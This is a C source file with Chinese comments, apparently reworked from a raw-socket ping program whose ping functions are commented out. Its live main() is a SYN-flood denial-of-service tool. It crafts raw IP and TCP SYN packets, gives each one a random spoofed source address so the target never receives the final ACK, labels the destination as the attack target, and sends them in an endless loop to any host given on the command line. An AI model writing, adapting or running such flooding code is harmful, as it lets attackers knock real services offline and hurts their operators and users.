#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <sys/time.h>
#include <netinet/ip_icmp.h>
#include <unistd.h>
#include <signal.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define MAX_SIZE 1024
#define LOCALPORT 8888
#define DESTPORT 8900

char send_buf[MAX_SIZE];
char recv_buf[MAX_SIZE];
int nsend = 0,nrecv = 0;
int datalen = 56;

//统计结果
/*void statistics(int signum)
{
    printf("\n----------------PING statistics---------------\n");
    printf("%d packets transmitted,%d recevid,%%%d lost\n",nsend,nrecv,(nsend - nrecv)/nsend * 100);
    exit(EXIT_SUCCESS);
}*/

//校验和算法
int calc_chsum(unsigned short *addr,int len)
{
    int sum = 0,n = len;
    unsigned short answer = 0;
    unsigned short *p = addr;
    
    //每两个字节相加
    while(n > 1)
    {
        sum += *p ++;
        n -= 2;
    }
    
    //处理数据大小是奇数，在最后一个字节后面补0
    if(n == 1)
    {
        *((unsigned char *)&answer) = *(unsigned char *)p;
        sum += answer;
    }
    
    //将得到的sum值的高2字节和低2字节相加
    sum = (sum >> 16) + (sum & 0xffff);
    
    //处理溢出的情况
    sum += sum >> 16;
    answer = ~sum;

    return answer;
}

/*int pack(int pack_num)
{
    int packsize;
    struct icmp *icmp;
    struct timeval *tv;

    icmp = (struct icmp *)send_buf;
    icmp->icmp_type = ICMP_ECHO;
    icmp->icmp_code = 0;
    icmp->icmp_cksum = 0;
    icmp->icmp_id = htons(getpid());
    icmp->icmp_seq = htons(pack_num);
    tv = (struct timeval *)icmp->icmp_data;

    //记录发送时间
    if(gettimeofday(tv,NULL) < 0)
    {
        perror("Fail to gettimeofday");
        return -1;
    }
    
    packsize = 8 + datalen;
    icmp->icmp_cksum = calc_chsum((unsigned short *)icmp,packsize);
    
    return packsize;
}

int send_packet(int sockfd,struct sockaddr *paddr)
{
    int packsize;
    
    //将send_buf填上a
    memset(send_buf,'a',sizeof(send_buf));

    nsend ++;
    //打icmp包
    packsize = pack(nsend);

    if(sendto(sockfd,send_buf,packsize,0,paddr,sizeof(struct sockaddr)) < 0)
    {
        perror("Fail to sendto");
        return -1;
    }

    return 0;
}

struct timeval time_sub(struct timeval *tv_send,struct timeval *tv_recv)
{
    struct timeval ts;

    if(tv_recv->tv_usec - tv_send->tv_usec < 0)
    {
        tv_recv->tv_sec --;
        tv_recv->tv_usec += 1000000;
    }

    ts.tv_sec = tv_recv->tv_sec - tv_send->tv_sec;
    ts.tv_usec = tv_recv->tv_usec - tv_send->tv_usec;

    return ts;
}*/

/*int unpack(int len,struct timeval *tv_recv,struct sockaddr *paddr,char *ipname)
{
    struct ip *ip;
    struct icmp *icmp;
    struct timeval *tv_send,ts;
    int ip_head_len;
    float rtt;

    ip = (struct ip *)recv_buf;
    ip_head_len = ip->ip_hl << 2;
    icmp = (struct icmp *)(recv_buf + ip_head_len);
    
    len -= ip_head_len;
    if(len < 8)
    {
        printf("ICMP packets\'s is less than 8.\n");
        return -1;
    }
        
    if(ntohs(icmp->icmp_id) == getpid() && icmp->icmp_type == ICMP_ECHOREPLY)
    {
        nrecv ++;
        tv_send = (struct timeval *)icmp->icmp_data;
        ts = time_sub(tv_send,tv_recv);
        rtt = ts.tv_sec * 1000 + (float)ts.tv_usec/1000;//以毫秒为单位
        printf("%d bytes from %s (%s):icmp_req = %d ttl=%d time=%.3fms.\n",
            len,ipname,inet_ntoa(((struct sockaddr_in *)paddr)->sin_addr),ntohs(icmp->icmp_seq),ip->ip_ttl,rtt);
    }
    
    return 0;
}*/

/*int recv_packet(int sockfd,char *ipname)
{
    int addr_len ,n;
    struct timeval tv;
    struct sockaddr from_addr;
    
    addr_len = sizeof(struct sockaddr);
    if((n = recvfrom(sockfd,recv_buf,sizeof(recv_buf),0,&from_addr,&addr_len)) < 0)
    {
        perror("Fail to recvfrom");
        return -1;
    }

    if(gettimeofday(&tv,NULL) < 0)
    {
        perror("Fail to gettimeofday");
        return -1;
    }

    unpack(n,&tv,&from_addr,ipname);

    return 0;
}
*/

int main(int argc,char *argv[])
{
    int size = 50 * 1024;
    int sockfd,netaddr;
    struct protoent *protocol;
    struct hostent *host;
    struct sockaddr_in peer_addr;
    
    struct ip *ip_ptr; // ip 头指针
    //char ip_buffer[100]; // 定义存放数据报的缓冲区
    struct tcphdr *tcp_ptr;  // tcp头指针
    int head_len;
    
    //bzero(ip_buffer,100); 
    head_len = sizeof(struct ip)+sizeof(struct tcphdr);  

    if(argc < 2)
    {
        fprintf(stderr,"usage : %s ip.\n",argv[0]);
        exit(EXIT_FAILURE);
    }
    
    //获取icmp的信息
    /*if((protocol = getprotobyname("tcp")) == NULL)
    {
        perror("Fail to getprotobyname");
        exit(EXIT_FAILURE);
    }*/
    
    //创建原始套接字
    if((sockfd = socket(AF_INET, SOCK_RAW,IPPROTO_TCP)) < 0) // 设置成AF_PACKET，不让系统自动添加IP头    AF_INET
    {
        perror("Fail to socket");
        exit(EXIT_FAILURE);
        
        struct ip *ip_ptr;
    }


    //回收root权限,设置当前用户权限
    setuid(getuid());

    /*
     扩大套接子接收缓冲区到50k，这样做主要为了减少接收缓冲区溢出的可能性
     若无影中ping一个广播地址或多播地址，将会引来大量应答
     */
    const int one = 1;
    if(setsockopt(sockfd,IPPROTO_IP,IP_HDRINCL,&one,sizeof(one)) < 0)
    {
        perror("Fail to setsockopt");
        exit(EXIT_FAILURE);
    }

    //填充对方的地址
    bzero(&peer_addr,sizeof(peer_addr));
    peer_addr.sin_family = AF_INET;
    //peer_addr.sin_port = htons(DESTPORT);  
    //判断是主机名(域名)还是ip
    if((netaddr = inet_addr(argv[1])) == INADDR_NONE)
    {    
        //是主机名（域名）
        if((host = gethostbyname(argv[1])) == NULL)
        {
            fprintf(stderr,"%s unknown host : %s.\n",argv[0],argv[1]);
            exit(EXIT_FAILURE);
        }

        memcpy((char *)&peer_addr.sin_addr,host->h_addr,host->h_length);
        
    }else{//ip地址
        peer_addr.sin_addr.s_addr = netaddr;
    }
    
    //注册信号处理函数
    //signal(SIGALRM,statistics);
    //signal(SIGINT,statistics);
    //alarm(5);

    //开始信息
    printf("PING %s(%s) %d bytes of data.\n",argv[1],inet_ntoa(peer_addr.sin_addr),datalen);

    // 开始填充IP数据报的头部
    ip_ptr = (struct ip *)send_buf;
    ip_ptr->ip_v = IPVERSION; // ipv4
    ip_ptr->ip_hl = sizeof(struct ip)>>2; // IP数据报的头部长度
    ip_ptr->ip_tos = 0;               // 服务类型  
    ip_ptr->ip_len = htons(head_len); // IP数据报的长度  
    ip_ptr->ip_id = 0;             // IP id 由内核填写  
    ip_ptr->ip_off = 0;      // 由内核填写
    ip_ptr->ip_ttl = MAXTTL;  
    ip_ptr->ip_p = IPPROTO_TCP;         //传输层协议为TCP
    ip_ptr->ip_sum = 0;
    ip_ptr->ip_dst = peer_addr.sin_addr;     // 目的地址，即攻击目标 

    // 开始填写TCP数据报  
    tcp_ptr = (struct tcphdr*)(send_buf + sizeof(struct ip)); //获取指向TCP头部的指针 
    tcp_ptr->source = htons(LOCALPORT);  
    tcp_ptr->dest = htons(DESTPORT); // 目的端口  
    tcp_ptr->seq = random();      // 随机产生序列号  
    //tcp_ptr->ack_seq = 0;  
    tcp_ptr->doff = 5;  
    tcp_ptr->syn = 1; // 表示SYN数据报
    tcp_ptr->check = 0; 


    //发送包文和接收报文
    while(1)
    {
        /*随机产生源地址，使服务器收不到最后一个ACK应答*/  
        ip_ptr->ip_src.s_addr=random();  
        //printf("fake ip:  %s\n", inet_ntoa(ip_ptr->ip_src));

        //sendto(sockfd,ip_buffer,head_len,0,(struct sockaddr *)&peer_addr,sizeof(struct sockaddr));  
        //send_packet(sockfd,(struct sockaddr *)&peer_addr);
        //recv_packet(sockfd,argv[1]);
        tcp_ptr->check=calc_chsum((unsigned short*)tcp_ptr,sizeof(struct tcphdr));
        if(sendto(sockfd,send_buf,head_len,0,(struct sockaddr*)&peer_addr,sizeof(struct sockaddr_in)) < 0)
        {
            perror("Fail to sendto");
            return -1;
        }
        //alarm(5);
        //sleep(1);
    }

    exit(EXIT_SUCCESS);

}
